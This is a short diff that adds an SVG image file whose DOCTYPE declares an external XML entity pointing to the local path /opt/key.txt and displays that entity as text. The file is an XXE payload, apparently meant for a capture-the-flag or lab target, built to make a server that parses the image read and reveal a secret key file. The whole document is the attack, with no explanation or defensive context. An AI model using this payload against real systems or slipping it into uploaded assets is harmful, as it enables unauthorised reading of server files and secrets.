@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE svg [ <!ENTITY tasty SYSTEM "file:///opt/key.txt"> ]>
+<svg width="520px" height="100px"  xmlns="http://www.w3.org/2000/svg">
+    <g>
+        <text font-size="13"  x="25" y="60">
+           &tasty;
+        </text>
+    </g>
+</svg> 
